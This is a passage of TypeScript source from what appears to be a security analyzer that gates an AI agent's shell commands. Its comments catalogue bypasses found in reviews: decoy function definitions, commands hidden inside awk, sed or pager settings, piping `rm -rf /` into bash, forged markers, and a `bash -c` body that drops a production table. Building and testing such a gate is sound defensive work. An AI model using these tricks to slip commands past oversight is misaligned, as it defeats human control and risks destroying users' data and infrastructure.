    const m = /^(?:-O|--open-files-in-pager=)(.+)$/.exec(w);
    if (m?.[1]) out.push(m[1]);
  }
  return out;
}

function awkShellCommands(seg: string, ctx?: EvaluationContext, cwd?: string): string[] {
  const t = tokenize(seg);
  // THE HEAD IS FOUND WHERE THE COMMAND STARTS, not at token 0: `FOO=bar awk …` and `command awk …` are the same
  // awk invocation, and anchoring at position 0 missed both (exit review 7, cross-product).
  let i = 0;
  while (i < t.length) {
    const w = t[i]!;
    if (
      /^[A-Za-z_][A-Za-z0-9_]*=/.test(w) ||
      WRAPPERS.has(w) ||
      PREFIX_KEYWORDS.has(w) ||
      /^(timeout|sudo|doas|xargs|--)$/.test(w)
    ) {
      i++;
      // a wrapper's own operands: `nice -n 5`, `timeout 60`, `exec -c -a NAME`
      while (i < t.length && /^(-|\d)/.test(t[i]!)) {
        const opt = t[i]!;
        i++;
        if (/^(-n|-a|-C|-u|-g|-p|-t)$/.test(opt) && i < t.length && !t[i]!.startsWith('-')) i++;
      }
      continue;
    }
    break;
  }
  const head = (t[i] ?? '').replace(/^.*\//, '');
  if (!/^(awk|gawk|mawk|nawk)$/.test(head)) return [];
  const out: string[] = [];
  // `-f progfile` NAMES THE PROGRAM, and a progfile inside the workspace is readable. `awk -fevil.awk data.txt`
  // with `BEGIN{system("git push origin main")}` in the file pushed at ALLOW, because only the command line was
  // read (exit review 9). With `-f`, no bare operand is the program: every one of them is an input FILE.
  const fromFiles: string[] = [];
  const unread: string[] = [];
  let sawF = false;
  for (let j = i + 1; j < t.length; j++) {
    const w = t[j]!;
    const f =
      w === '-f' || w === '--file' || w === '--source-file'
        ? (t[++j] ?? null)
        : (/^(?:--file=|--source-file=|-f)(.+)$/.exec(w)?.[1] ?? null);
    if (f === null) continue;
    sawF = true;
    if (ctx && cwd !== undefined && !/[$`*?]/.test(f)) {
      const text = readInsideWorkspace(ctx, isAbsolute(f) ? f : resolve(cwd, f));
      if (text !== null) fromFiles.push(text);
      // A PROGRAM FILE THIS KERNEL COULD NOT READ IS NOT AN EMPTY PROGRAM. Over the size cap, outside the
      // workspace, or simply unreadable, the read returns null — and this was the one reader in the file that
      // dropped that null silently, so padding a program past the cap made it invisible (exit review 10). The
      // sentinel is a command the analyzer cannot resolve, which is exactly what the situation is.
      else unread.push(f);
    } else unread.push(f);
  }
  // an unreadable program file is handed over as a command the analyzer cannot resolve, so the opacity reaches
  // the verdict instead of the program reading as empty
  const program = sawF
    ? fromFiles.join('\n')
    : t.slice(i + 1).filter((x) => !x.startsWith('-')).join(' ');
  if (unread.length) out.push(`${MARK}awk-program-file ${unread[0]!}`);
  const literals = new Map<string, string>();
  for (const m of program.matchAll(/([A-Za-z_]\w*)\s*=\s*"((?:[^"\\]|\\.)*)"/g)) literals.set(m[1]!, m[2]!);
  for (const m of program.matchAll(/\bsystem\s*\(\s*"((?:[^"\\]|\\.)*)"\s*\)/g)) out.push(m[1]!);
  for (const m of program.matchAll(/\|\s*&?\s*"((?:[^"\\]|\\.)*)"/g)) out.push(m[1]!);
  for (const m of program.matchAll(/"((?:[^"\\]|\\.)*)"\s*\|\s*&?\s*getline/g)) out.push(m[1]!);
  // `print … | VAR` and `system(VAR)`: the variable's literal value is the command
  for (const m of program.matchAll(/(?:\|\s*&?\s*|\bsystem\s*\(\s*)([A-Za-z_]\w*)\b/g)) {
    const v = literals.get(m[1]!);
    if (v !== undefined) out.push(v);
  }
  return out;
}

/** The command line `kubectl exec pod -- CMD …` and its neighbours carry after the separator. Against a LOCAL
 *  cluster the verb kept its ALLOW while that command was never analysed at all (exit review 3), so it is fed
 *  back into the canonical pipeline as its own segment. */
function execCarriedCommand(seg: string): string | null {
  const t = tokenize(seg);
  const head = t[0] ?? '';
  if (!/^(kubectl|oc|docker|podman|nerdctl)$/.test(head)) return null;
  if (!t.some((x) => /^(exec|attach|debug)$/.test(x))) return null;
  const dd = t.indexOf('--');
  // RE-QUOTED, because the carried command is handed back as TEXT and `join(' ')` is not the inverse of
  // `tokenize`: an awk program or a `-c` body carried after the separator is one word, and joining the tokens
  // erased the quoting that said so (exit review 7, cross-product).
  return dd >= 0 && dd + 1 < t.length ? requote(t.slice(dd + 1)) : null;
}

/** THE canonical semantic-analysis pipeline.
 *
 *  Invariant (product decision, 2026-09-22): the same semantic action receives the same security analysis whether it
 *  appears at top level, inside a Makefile recipe, inside a package script, inside a shell script or behind any other
 *  supported producer. Nested analysis may ADD context; it may never lose a protection that applies at top level.
 *
 *  Both entry points delegate here: `classifyCommand` for a host tool call, and the effect recursion in
 *  `classifyNormalized` for a resolved producer body. Before this existed the recursion re-entered a SUB-layer
 *  (matchers only), so a nested effect was analysed strictly more weakly than the identical text at top level —
 *  `echo x > $EGO_HOME/trust/keys` was an absolute deny at top level and an ALLOW inside a make recipe.
 *
 *  Recursion is bounded by `state.depth` (truncation is opaque, never the parent's class) and by `state.seen`, which
 *  keys on execution identity (directory + target), not on a bare name. */
function analyzeSegments(
  table: CompiledAuthorityTable,
  ctx: EvaluationContext,
  compiled: Array<{ m: CompiledMatcher; re: RegExp }>,
  segments: string[],
  state: EffectState,
  /** true when each segment runs in its OWN shell, so a `cd` must not leak to the next one. GNU make starts a shell
   *  per recipe line, and npm runs pre/main/post as separate processes (challenge 4, findings 4, 19, 26, 33). */
  isolatedShells = false,
): CapabilityHit[] {
  const hits: CapabilityHit[] = [];
  // THE SECOND LOCK ON MARKER FORGERY. Every string that reaches this function came from OUTSIDE the analyzer —
  // the tool's command, a carried shell body, a literal piped into an interpreter, a script line, a make recipe,
  // a manifest script, a hook body — and the markers are injected BELOW this point, by `splitShellPipeline` and
  // `normalizeSegment`. So mangling the sentinel here cannot destroy a real marker, and it makes a forged one
  // (`\0ego\0define-function git; git push origin main`) into what it actually is: an unknown command.
  segments = segments.map(externalText);
  // TRANSITIVE FRESHNESS: the ledger belongs to the COMMAND, not to one producer, and is mutated in place. A copy
  // here is what made `./configure && make build` reuse the Makefile configure had just rewritten — the write
  // happened one level down and never came back out (challenge 6, findings 6, 13, 19).
  const written = state.env.written;
  // A body can REDEFINE a name for everything after it: a shell function, an alias, or a standalone assignment of
  // an execution input. These failed safe only because the defining line itself was unclassified — an accident,
  // not a property. The redefinition accumulates across the unit exactly like the write ledger, and resets per
  // isolated shell, because a make recipe line and an npm pre/post script are separate processes.
  let carriedEnv: Record<string, string> = {};
  let rebound: string | null = null;
  // A FUNCTION OR ALIAS REBINDS THE NAME IT DECLARES, NOT EVERY NAME. Marking the whole unit redefined made an
  // ordinary `build() { ls; }` — and every script that defines a helper — opaque, while the case the rule exists
  // for is `tsc() { git push …; }` FOLLOWED BY `tsc -p .`, where the name really is used (exit review 4). A
  // lookup-path rebind (`PATH=…`) stays global, because it re-points every later command.
  const definedNames = new Map<string, string>();
  /** names DEFINED AS FUNCTIONS in this unit: their bodies are handed over at the definition, so a call to one
   *  adds no closure. An `alias` body is NOT handed over and keeps its binding gap. */
  const functionNames = new Set<string>();
  // each UNIT is one shell invocation; `cd a && b` inside a unit still moves the directory for `b` (cwdTimeline)
  // EVERY unit is split into the commands it runs, HERE, whatever the isolation. A producer's contract is to
  // resolve WHICH lines execute and hand them over verbatim — `scriptSegments` emits whole lines — so turning a
  // line into commands is the analyzer's job. Splitting only the isolated shells meant a script body's line was
  // classified as its FIRST command alone: `echo "$(git push origin main)"` in a `.sh` was an `echo`, and so was
  // `echo start; git push origin main`. Isolation decides whether shell state RESETS between units, nothing else.
  // A NON-ISOLATED UNIT IS ONE SHELL, SO IT IS SPLIT ONCE, WHOLE. Splitting a script body line by line reset the
  // splitter's cross-line state, and a `case` construct whose branches sit below `case "$1" in` kept its pattern
  // glued to the command — the multi-line spelling of the defect exit review 4 found on one line. Make recipe
  // lines and npm pre/post scripts ARE separate shells, and keep their per-line split.
  const units = isolatedShells
    ? segments.map((u) => splitShellPipeline(u))
    : [splitShellPipeline(segments.join('\n'))];
  for (const unit of units) {
    if (isolatedShells) {
      // a fresh shell per recipe line / per pre|main|post script: its timeline starts from the caller's directory
      carriedEnv = {};
      rebound = null;
      definedNames.clear();
      functionNames.clear();
    }
    // A DEFINITION THE SHELL MAY NEVER EXECUTE BINDS NOTHING. `if false; then git() { echo hi; }; fi` does not
    // define `git`, and neither does a definition inside a `while`/`until`/`for`/`case` branch or one that is a
    // PIPELINE stage, since every stage runs in its own subshell. The analyzer recorded the name anyway, and the
    // real `git push origin main` that followed was classified as a call to a known local function — read-only,
    // ALLOW, through an organization-locked deny and through absolute core denies for psql and the cloud CLIs
    // (exit review 8). A binding is trusted only where it is UNCONDITIONAL.
    let condDepth = 0;
    /** how deep inside a function BODY this segment sits: its bindings are the function's, not the caller's */
    let fnBodyDepth = 0;
    const stages = unit;
    const timeline = cwdTimeline(stages, state.env.cwd, state.env.cwdVerified, (abs) => readInsideWorkspace(ctx, abs));
    /** the symlink pairs earlier segments recorded, refreshed at each stage */
    let linkPairsNow: Array<[string, string]> = [];
    /** EVERY write goes through here: the path, the same path reached through a symlink made earlier in this command
     *  (or through a linked ANCESTOR directory), and - since a hard link is a second name the path cannot reveal - a
     *  wildcard when the file being replaced has more than one. */
    const recordWrite = (raw: string): void => {
      const c = canonicalPath(raw);
      written.add(c);
      for (const [link, target] of linkPairsNow)
        if (target && (c === link || c.startsWith(link + '/'))) written.add(target + c.slice(link.length));
      try {
        if (statSync(c).nlink > 1 && statSync(c).isFile()) written.add('\0any');
      } catch {
        /* not there yet: nothing to alias */
      }
    };
    // A LOOP RUNS ITS BODY AGAIN, so what a later iteration writes is what an earlier one read: `for i in 1 2; do make
    // all; cp evil.mk Makefile; done` runs the replaced makefile on its second pass. The writes of every loop body are
    // recorded before the loop starts, which makes anything it resolves inside stale (exit review 10, self-attack).
    for (let li = 0; li < stages.length; li++) {
      const lt = expandBraces(stages[li]!.text).trim();
      if (!/^(?:(?:time|!)\s+)*(for|while|until|select)\b/.test(lt)) continue;
      let depth = 0;
      for (let lj = li; lj < stages.length; lj++) {
        const body = expandBraces(stages[lj]!.text).trim();
        if (/^(?:(?:time|!)\s+)*(for|while|until|select)\b/.test(body)) depth++;
        if (/^done\b/.test(body) && --depth === 0) break;
        if (lj === li) continue;
        const dirs = (timeline[lj]?.dirs.length ? timeline[lj]!.dirs : [state.env.cwd]) as string[];
        for (const n of new Set([body, ...normalizeSegment(body)])) {
          for (const d of dirs) for (const w of writtenPathOperands(n, d)) { if (w === LEDGER_ANY) written.add('\0any'); else recordWrite(w); }
          if (writesUnenumerably(n)) written.add('\0any');
        }
        for (const t of redirectionTargets(body)) {
          if (/[$`*?[{]/.test(t)) written.add('\0any');
          else for (const d of dirs) recordWrite(isAbsolute(t) ? t : resolve(d, t));
        }
      }
    }
    // the stage whose standard output the NEXT piped stage will read. A GROUP writes the CONCATENATION of what
    // its commands write, so this is a LIST: `{ echo 'git push origin main'; echo ls; } | sh` feeds the shell
    // both lines, and keeping only the last stage lost the first (exit review 7).
    let upstream: string | null = null;
    let upstreamParts: string[] = [];
    let upstreamGroup: number | undefined;
    let upstreamBody: { body: string; expanded: boolean } | null = null;
    for (const [stageIndex, stage] of stages.entries()) {
    // BRACE EXPANSION HAPPENS HERE, ONCE, BEFORE ANY READER SEES THE SEGMENT — matchers, the redirection target
    // scan, pathTokens, the short-flag cluster reader and every producer. The shell does it ahead of everything
    // else, so a reader given the unexpanded text is reading a word that will never exist (exit review 9).
    const braceOverflow = { hit: false };
    const seg = expandBraces(stage.text, braceOverflow);
    // `if`/`while`/`until`/`for`/`case` open a branch whose body may not run; `fi`/`done`/`esac` close it
    // ...through `time` and `!`, which are reserved words in FRONT of a compound command: `time if false` opens the
    // same branch `if false` does (exit review 10, cross-product)
    const kw = /^(?:(?:time|!)\s+(?:-\S+\s+)*)*(if|while|until|for|case|select)\b/.exec(seg.trim());
    const kwEnd = /^(fi|done|esac)\b/.test(seg.trim());
    // A stage that FEEDS a pipe, or is fed by one, runs in its own subshell. For a function DEFINITION the pipe
    // is attached to the stage after the whole BODY — `git() { echo hi; } | cat` puts it on `cat` — so the look
    // ahead skips the body's group before asking.
    let after = stageIndex + 1;
    while (stages[after]?.groupId !== undefined) after++;
    const inPipeline = stage.pipedFromPrevious === true || stages[after]?.pipedFromPrevious === true;
    // A `case` ARM IS A BRANCH THAT MAY NOT RUN, AND THE SPLITTER CONSUMES ITS HEADER: `case x in y) cd sub ;; esac`
    // reaches this loop as `cd sub`, with no `case` word left for the keyword test above to count (exit review 10,
    // state-flow). The splitter says which stages sit inside one.
    const bindingIsProven = condDepth === 0 && !inPipeline && fnBodyDepth === 0 && stage.inCase !== true;
    if (kw) condDepth++;
    else if (kwEnd) condDepth = Math.max(0, condDepth - 1);
    const stdinFrom = stage.pipedFromPrevious ? upstream : null;
    const stdinParts = stage.pipedFromPrevious ? upstreamParts : [];
    const upstreamHeredoc = stage.pipedFromPrevious ? upstreamBody : null;
    // a word this kernel refused to expand is a word it has not read: report the opacity rather than treating
    // the unexpanded braces as the text that will run
    if (braceOverflow.hit)
      hits.push(
        opaqueHit(table, ctx, seg, 'a brace expansion produces more words than this kernel enumerates'),
      );
    // an endpoint named by the environment points the whole command somewhere else, and the normalizer strips
    // the assignment because its value is not a program — so it is read here, from the segment as written
    // GIT'S TRACE VARIABLES APPEND TO ANY PATH THEY NAME: `GIT_TRACE2_EVENT=.harness/runtime/state.json git log` turns a
    // read into a write of governed state. A value that is a descriptor or a boolean goes to standard error (exit review 10)
    for (const text of [seg, ...carrierCommandValues(seg)])
      for (const m of text.matchAll(/(?:^|[\s;&|'"(])(GIT_TRACE[A-Z0-9_]*)=('[^']*'|"[^"]*"|[^\s;&|'"]*)/g)) {
        const v = m[2]!.replace(/^['"]|['"]$/g, '');
        if (!v || /^(0|1|2|3|4|5|6|7|8|9|true|false|yes|no|on|off)$/i.test(v)) continue;
        const traceBase = timeline[stageIndex]?.dirs[0] ?? state.env.cwd;
        const target = expandHome(v, traceBase);
        if (target === null || /[$`*?[{]/.test(target)) continue;
        const h = classifyPath(table, ctx, 'Write', isAbsolute(target) ? target : resolve(traceBase, target));
        hits.push({ ...h, via: `${m[1]} appends to ${v} (${h.via})`, segment: seg });
      }
    const endpointHit = endpointEnvHit(seg);
    if (endpointHit !== null)
      hits.push({
        capability: 'command.network-tool',
        verdict: verdictFor(table, ctx, 'command.network-tool'),
        via: `an endpoint is named by the environment: ${endpointHit}`,
        segment: seg,
        absolute: false,
      });
    const hitsBefore = hits.length;
    // `cd DIR` moves the working directory for the following segments (a dynamic target makes it unknown). Options
    // and `--` are skipped (`cd -- .harness/generated`, `cd -P dir`), and the directory is the last positional.
    const cdTrimmed = seg.trim();
    // The subshell's working directory is RESTORED here, and a restore is state rather than a command: classifying
    // the marker made every ordinary `( cd docs && ls )` ask as an unknown command (exit review 4).
    if (cdTrimmed === SUBSHELL_CWD_RESTORE) continue; // the timeline already ignored the stages this marker closed
    if (cdTrimmed === HEREDOC_UNTERMINATED) {
      hits.push(
        opaqueHit(table, ctx, seg, 'a heredoc delimiter never arrived, so the rest of this command was read as its body'),
      );
      continue;
    }
    // a consumed function header binds a name for everything after it, and is not a command
    if (cdTrimmed.startsWith(`${FUNCTION_DEF_PREFIX} `)) {
      if (bindingIsProven) functionNames.add(cdTrimmed.slice(FUNCTION_DEF_PREFIX.length + 1));
      // ...and everything until the body closes is the FUNCTION's, not the caller's: its commands are analysed,
      // but a `cd` or a definition inside it does not move or rebind anything outside (exit review 10)
      fnBodyDepth++;
      continue;
    }
    if (cdTrimmed === FUNCTION_BODY_END) {
      fnBodyDepth = Math.max(0, fnBodyDepth - 1);
      continue;
    }
    if (cdTrimmed.startsWith(`${FUNCTION_UNBIND} `)) {
      const name = cdTrimmed.slice(FUNCTION_UNBIND.length + 1);
      functionNames.delete(name);
      definedNames.delete(name);
      continue;
    }
    // `unset -f NAME` UNBINDS IT AGAIN, and everything after it is the REAL program. A definition earlier in the
    // script made the name a known local function whose body the analyzer had already read — which is true only
    // while the definition stands. `aws() { echo hi; }; unset -f aws; aws iam delete-user --user-name bob`
    // deleted an IAM user at ALLOW, because the decoy definition was still believed (exit review 9). `unset`
    // with no `-f` removes a VARIABLE and leaves the function alone; `unset -v` likewise.
    const unset = /^unset\s+(.*)$/.exec(cdTrimmed);
    if (unset) {
      const args = tokenize(cdTrimmed).slice(1);
      const functionsToo = !args.some((a) => /^-[a-zA-Z]*v$/.test(a)) || args.some((a) => /^-[a-zA-Z]*f$/.test(a));
      if (functionsToo) for (const a of args) if (!a.startsWith('-')) functionNames.delete(a);
    }
    // THE WORKING DIRECTORY COMES FROM THE TIMELINE (cwdTimeline), a set that says where this stage MAY run. More than
    // one, or an unknown, means the directory is not established: nothing positive rests on it, and every relative
    // path below is judged in each of them.
    linkPairsNow = [...written].filter((w) => w.startsWith('\0link:')).map((w) => w.slice(6).split('\0->') as [string, string]);
    const point = timeline[stageIndex] ?? { dirs: [state.env.cwd], unknown: false, dynamicCd: false };
    const cwd = point.dirs[0] ?? CWD_UNKNOWN;
    const altDirs = point.dirs.slice(1);
    const cdUnproven = point.dirs.length > 1 || point.unknown;
    if (point.dynamicCd)
      hits.push({
        capability: 'command.unknown',
        verdict: verdictFor(table, ctx, 'command.unknown'),
        via: 'cd to a directory that cannot be resolved',
        segment: seg,
        absolute: false,
      });
    // `git commit` hook bypass: --no-verify, or a short-flag cluster containing `n` (`-n`, `-nm`, `-nam`, `-vn`).
    // Scanned on quote-aware tokens so a `-n` inside the `-m` message (a quoted token) is never a false positive. The
    // command carried in a quoted `env -S`/`--split-string`/`bash|sh -c` value is scanned too (its inner quoting is
    // preserved), so `env -S 'git commit -nm x'` is caught while `env -S 'git commit -m "fix -n"'` is not.
    if ([seg, ...carrierCommandValues(seg)].some((s) => commitBypassFlag(s)))
      hits.push({
        capability: 'git.hooks.bypass',
        verdict: verdictFor(table, ctx, 'git.hooks.bypass'),
        via: 'git commit hook-bypass flag',
        segment: seg,
        absolute: isAbsoluteCap(table, 'git.hooks.bypass'),
      });
    const effectiveCwd = cwd === '\0dynamic' ? state.env.cwd : cwd;
    // a declared name matters exactly where it is USED
    const segHead = (tokenize(seg)[0] ?? '').replace(/^.*\//, '');
    // A FUNCTION DEFINED HERE IS NOT AN UNRESOLVED BINDING. Its body was handed over at the definition, so EGO
    // knows exactly what the name means — reporting a binding gap for it made every script that defines a helper
    // and calls it ask, `usage` in a real hook among them (exit review 5). An alias keeps its gap: its body is
    // not handed over, so the name really is bound to something the analyzer never read.
    const bindingWhy = rebound ?? definedNames.get(segHead) ?? null;
    // the tracked working directory IS the resolution context; when `cd` went somewhere dynamic it is not proven,
    // and every conclusion drawn from a relative path below is downgraded rather than guessed
    const env: ExecutionEnvironment = {
      ...state.env,
      written,
      cwd: effectiveCwd,
      cwdVerified: cwd !== '\0dynamic' && !cdUnproven,
      // ENVIRONMENT-INPUT CLOSURE: captured HERE, before normalizeSegment strips the assignments, so the producer
      // boundary sees what the command line did to the tool it is about to resolve
      envInputs: { ...state.env.envInputs, ...carriedEnv, ...segmentEnvInputs(seg) },
      definedNames: functionNames,
      rawSegment: seg,
      // A HEREDOC IS STANDARD INPUT THE KERNEL CAN READ. `docker build -f - . <<EOF … EOF` writes the whole
      // Dockerfile right there on the command line.
      ...(stage.heredocBody !== undefined ? { stdinText: stage.heredocBody } : {}),
      ...(bindingWhy !== null ? { binding: { kind: 'redefined' as const, why: bindingWhy } } : {}),
      get treeFresh(): boolean {
        return !written.has(TREE_DIRTY);
      },
    };
    // `git -C dir …` genuinely runs in `dir`, and normalization strips the option before any producer sees it.
    // The directory a command runs in belongs to the ENVIRONMENT, so it is recorded here rather than rediscovered
    // downstream from a string the normalizer has already rewritten (challenge 8, producer subject identity).
    // `-C` is a git GLOBAL option, which means before the verb. `git blame -C file` and `git diff -C` use the
    // same letter for "detect copies", and matching it anywhere downgraded every one of them to an unverified
    // context — ordinary review commands, asking for no reason.
    // `-C` GLUES ITS VALUE like every other short option: `env -C.harness/runtime tee pin.json` names that
    // directory, and requiring whitespace after the letter missed it (self-attack on exit review 9).
    const runDir = runDirectory(seg, effectiveCwd);
    if (runDir !== null) {
      const target = expandHome(runDir.dir);
      if (target !== null && !/[$`*?[{]/.test(target) && runDir.known) {
        env.cwd = isAbsolute(target) ? target : resolve(effectiveCwd, target);
        env.cwdVerified = env.cwdVerified && directoryExists(env.cwd) && repoRootFor(ctx, env.cwd) !== null;
      } else env.cwdVerified = false;
    }
    const carried = execCarriedCommand(seg);
    if (carried !== null)
      for (const h of analyzeSegments(table, ctx, compiled, [carried], { ...state, env }, true))
        hits.push({ ...h, via: `${h.via ?? ''} (carried by exec)`.trim() });
    // A PIPELINE INSIDE A CARRIER IS STILL A PIPELINE, and the normalizer cannot carry the edge across: it returns
    // strings. The body re-enters the canonical analyzer whole, which is the only place the edge can be seen.
    // An awk program's shell commands have no other route in, so they are always handed over. Read from the RAW
    // segment: the program is ONE quoted word, and the normalizer has already dropped the quotes that say so.
    for (const body of awkShellCommands(seg, ctx, env.cwd))
      for (const h of analyzeSegments(table, ctx, compiled, [body], { ...state, env }, true))
        hits.push({ ...h, via: `${h.via ?? ''} (run by awk)`.trim() });
    // the same rule for the two other places where a readable command hides inside an option's value
    for (const body of sedShellCommands(seg, ctx, env.cwd))
      for (const h of analyzeSegments(table, ctx, compiled, [body], { ...state, env }, true))
        hits.push({ ...h, via: `${h.via ?? ''} (run by sed's e command)`.trim() });
    for (const body of gitPagerCommands(seg))
      for (const h of analyzeSegments(table, ctx, compiled, [body], { ...state, env }, true))
        hits.push({ ...h, via: `${h.via ?? ''} (run by git as the pager)`.trim() });
    for (const body of gitConfigCommands(seg))
      for (const h of analyzeSegments(table, ctx, compiled, [body], { ...state, env }, true))
        hits.push({ ...h, via: `${h.via ?? ''} (run by git from its configuration)`.trim() });
    for (const rawBody of carriedShellBodies(seg)) {
      // A CARRIED BODY IS A UNIT OF SHELL, and the state that flows between its commands flows there too. Only a
      // body containing a PIPE re-entered the analyzer; one containing `&&`, `;` or a newline was flattened into
      // sibling units of the OUTER segment, where the per-unit state — the working directory and the environment
      // — is the outer one. So `bash -c "export PGHOST=prod-db… && psql -c 'DROP TABLE users'"` lost the
      // assignment that the same text without the carrier carries perfectly well (exit review 7, cross-product).
      // A SINGLE-command body needs no re-entry FOR THE READERS THAT WORK ON THE NORMALIZED TEXT: the normalizer
      // reaches it on its own. It needs one for every reader that works on the SEGMENT AS WRITTEN, because
      // there the carrier's quoting stands where the body should be. Three of those were found missing three
      // different effects — the redirection scan (`sh -c "echo x > control-plan{e..e}/…"`), the `git -C`
      // working directory, and the commit hook-bypass argv (`sh -c "git commit -m x -{n..n}"`) — alongside the
      // option-value carriers found by the cross-product a review earlier. Re-entering EVERY body was tried and
      // is wrong: a duplicate hit does change the decisive capability and defeats the LOCAL de-escalation, and
      // nine tests said so at once. So the condition names what actually needs it.
      // the BODY is brace-expanded before these questions are asked of it: the carrier's quoting keeps the
      // braces literal at this level and the inner shell expands them, so `git commit -m x -{n..n}` only looks
      // like a hook bypass once it has been through the same expansion the inner shell performs
      const body = expandBraces(rawBody);
      // the condition is asked of the body AND of every body IT carries: `bash -c "flock l --command 'cd d && tee f'"` has
      // nothing to re-read at the first level and everything at the second
      const needsReentry = (b: string, depth = 0): boolean =>
        splitShellPipeline(b).length > 1 ||
        awkShellCommands(b, ctx, env.cwd).length > 0 ||
        sedShellCommands(b, ctx, env.cwd).length > 0 ||
        sedWrittenFiles(b, ctx, env.cwd).length > 0 ||
        gitPagerCommands(b).length > 0 ||
        gitConfigCommands(b).length > 0 ||
        redirectionTargets(b).length > 0 ||
        runDirectory(b, env.cwd) !== null ||
        commitBypassFlag(b) ||
        (depth < 4 && carrierCommandValues(b).some((x) => needsReentry(expandBraces(x), depth + 1)));
      if (needsReentry(body))
        for (const h of analyzeSegments(table, ctx, compiled, [body], { ...state, env }, true))
          hits.push({ ...h, via: `${h.via ?? ''} (carried by a shell carrier)`.trim() });
    }
    // A PIPE INTO AN INTERPRETER IS AN EXECUTION EDGE. `echo 'rm -rf /' | bash` runs the first stage's output as
    // the second stage's SCRIPT; with the `|` discarded the two looked unrelated and an absolute core deny asked
    // instead of being denied (exit review 4). When the upstream is a LITERAL, the text that will run is known and
    // is analysed as what it is; when it is not — `curl … | sh`, `cat f | sh` — something WILL run that was never
    // read, which is opacity and never ALLOW.
    // `bash <(echo 'rm -rf /')` hands the interpreter a FILE holding that command's output, and running it is the
    // same execution edge a pipe is — the operand is just spelled differently (exit review 5).
    const procSubScript =
      stage.fromProcessSubstitution === true &&
      /\$SUBST/.test(seg) &&
      RUNS_A_FILE_RE.test((tokenize(seg)[0] ?? '').replace(/^.*\//, ''))
        ? upstream
        : null;
    const stdinSource = stdinFrom ?? procSubScript;
    if (stdinSource !== null && (procSubScript !== null || normalizeSegment(seg).some(readsScriptFromStdin))) {
      const stdinFromResolved = stdinSource;
      // every command of the upstream group contributes its own literal line; if any of them is not readable the
      // whole standard output is not known, which is opacity rather than a partial script
      const parts = stdinParts.length > 1 && stdinFrom !== null ? stdinParts : [stdinFromResolved];
      // EACH COMMAND'S STANDARD OUTPUT CARRIES THE NEWLINE ITS EMITTER WRITES. `echo` appends one and `printf`
      // does not, so joining a group's parts with a newline split `{ printf 'git '; printf 'push origin main\n'; }`
      // into two unrelated words instead of the one command it really produces (exit review 8).
      const outs = parts.map((pt, k) => {
        const lit = literalStdout(pt, k === parts.length - 1 ? (upstreamHeredoc ?? undefined) : undefined);
        if (lit === null || parts.length === 1) return lit;
        return /^(?:\S*\/)?echo\b/.test(pt.trim()) && !/^(?:\S*\/)?echo\s+-[a-zA-Z]*n/.test(pt.trim())
          ? lit + '\n'
          : lit;
      });
      const literal = outs.some((o) => o === null) ? null : outs.join('');
      // A DATABASE CLIENT'S STANDARD INPUT IS SQL, NOT SHELL. Analysing it as a shell segment made
      // `echo 'select 1' | psql` an unknown command; what matters is that the script can RE-TARGET the session
      // with a `\c` before it does anything else, so the CLIENT is re-classified with the script appended and
      // the script itself is not read as commands (exit review 8).
      if (literal !== null && DB_CLIENT_HEADS.has(commandHead(seg)))
        for (const h of analyzeSegments(table, ctx, compiled, [`${seg} ${requote([literal])}`], { ...state, env }, true))
          hits.push({ ...h, via: `${h.via ?? ''} (the script this client reads from standard input)`.trim() });
      else if (literal !== null)
        for (const h of analyzeSegments(table, ctx, compiled, [literal], { ...state, env }, true))
          hits.push({ ...h, via: `${h.via ?? ''} (carried through a pipe)`.trim() });
      else
        hits.push(
          opaqueHit(table, ctx, seg, `runs the standard output of \`${stdinFromResolved}\`, which this kernel did not read`),
        );
    }
    // A CALL TO A FUNCTION DEFINED HERE runs the body that was already handed over at the definition, so the call
    // itself adds nothing — but its REDIRECTIONS and path operands are still its own, which is why the head is
    // marked rather than the segment skipped (exit review 5).
    // A LOCAL FUNCTION SHADOWS A BARE NAME, NEVER A PATH. `git() { true; }; /usr/bin/git push origin main` runs
    // the real program: the shell looks a function up by NAME, and a command with a slash in it is a path
    // (exit review 8). `segHead` has had its directory stripped, so the RAW head is what decides.
    const rawHead0 = tokenize(seg)[0] ?? '';
    const classifySeg =
      functionNames.has(segHead) && !rawHead0.includes('/') ? `${MARK}local-function ${seg}` : seg;
    for (const norm of normalizeSegment(classifySeg)) {
      const normHits = classifyNormalized(table, ctx, compiled, norm, { ...state, env });
      for (const h of normHits) hits.push(h);
      // a locked operation carried by any wrapper, launcher or placeholder the normalizer does not know is still found:
      // every suffix of the token list that starts with a governed tool is matched against the locked matchers
      // ...EXCEPT WHERE THE HEAD ONLY PRINTS ITS OPERANDS. `echo kubectl --context production apply -f k8s/` is a
      // sentence, not a call: `echo`, `printf`, `basename` and their kin never run a word they are handed, so a
      // governed tool name among their operands is data - which is what the self-documenting `show` target of
      // every release makefile prints (exit review 10). A wrapper that DOES run its operands is not in this set.
      if (!normHits.some((h) => h.verdict === 'DENY') && !STRING_OPERAND_HEADS.has(segHead)) {
        const marked = tokenizeMarked(seg);
        for (let k = 1; k < marked.length; k++) {
          if (marked[k]!.quoted) continue; // a verb inside quotes is data
          const name = marked[k]!.text.slice(marked[k]!.text.lastIndexOf('/') + 1);
          if (!LOCKED_HEADS.has(name)) continue;
          const suffix = [name, ...marked.slice(k + 1).map((t) => t.text)].join(' ');
          for (const sub of normalizeSegment(suffix)) {
            for (const { m, re } of compiled) {
              if (!re.test(sub)) continue;
              const lock = table.capabilities[m.capability]?.lock;
              if (
                lock === 'absolute' ||
                lock === 'organization' ||
                m.capability === 'command.env-inject' ||
                m.capability === 'ego.gate.bypass'
              )
                // the sweep rebuilds the suffix from the governed head, which DROPS a leading assignment — so
                // `AWS_ENDPOINT_URL=… aws s3 rm …` lost its endpoint here and was re-denied behind the resolver's
                // back. The rebuilt suffix is judged against the same environment the segment carries.
                hits.push(
                  retargetLocalCapability(
                    table,
                    ctx,
                    {
                      capability: m.capability,
                      verdict: verdictFor(table, ctx, m.capability),
                      via: `locked operation carried in argument position: ${sub}`,
                      segment: norm,
                      absolute: isAbsoluteCap(table, m.capability),
                    },
                    sub,
                    env.envInputs,
                    sub,
                  ),
                );
              break;
            }
          }
        }
      }
      // path arguments of the normalized command (after wrappers and global flags are stripped)
      // A SEARCH PATTERN IS DATA. Normalization de-quotes, so `grep 'rm -rf /' notes.md` reaches the path scan as
      // three tokens and `/` was read as a search ROOT — an ordinary code search denied as a recursive read of the
      // filesystem (exit review 5). The pattern's words are taken from the RAW segment, where it is still one word.
      const rawMarked = tokenizeMarked(seg);
      // the head is where the COMMAND starts: `LC_ALL=C grep 'rm -rf /' notes.md` has an assignment at token 0, and
      // reading that as the head made the search pattern a path (exit review 10)
